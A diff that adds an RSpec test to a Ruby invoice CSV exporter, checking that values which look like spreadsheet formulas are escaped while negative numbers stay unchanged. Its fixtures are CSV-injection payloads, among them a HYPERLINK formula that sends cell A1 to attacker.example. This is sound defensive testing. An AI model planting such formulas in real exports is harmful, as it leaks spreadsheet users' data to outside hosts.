@@ -115,6 +115,33 @@ RSpec.describe DataExports::Csv::Invoices, :premium do
       expect(generated_csv).to eq(expected_csv)
     end
 
+    context "when values would be read as spreadsheet formulas" do
+      let(:serialized_invoice) do
+        super().deep_merge(
+          customer: {
+            name: "=HYPERLINK(\"https://attacker.example/?c\"&A1,\"Open invoice\")",
+            email: "\t=1+1",
+            tax_identification_number: "-1+SUM(A1)"
+          },
+          purchase_order_number: "-1.5",
+          total_due_amount_cents: -150
+        )
+      end
+
+      it "escapes them and keeps numbers" do
+        file = result.csv_file
+        row = CSV.parse_line(file.read)
+        file.close
+        File.unlink(file.path)
+
+        expect(row[6]).to eq("'=HYPERLINK(\"https://attacker.example/?c\"&A1,\"Open invoice\")")
+        expect(row[7]).to eq("'\t=1+1")
+        expect(row[9]).to eq("'-1+SUM(A1)")
+        expect(row[11]).to eq("-1.5")
+        expect(row[26]).to eq("-150")
+      end
+    end
+
     context "when organization has multiple billing_entities" do
       let(:billing_entity) { create(:billing_entity, organization:) }
 
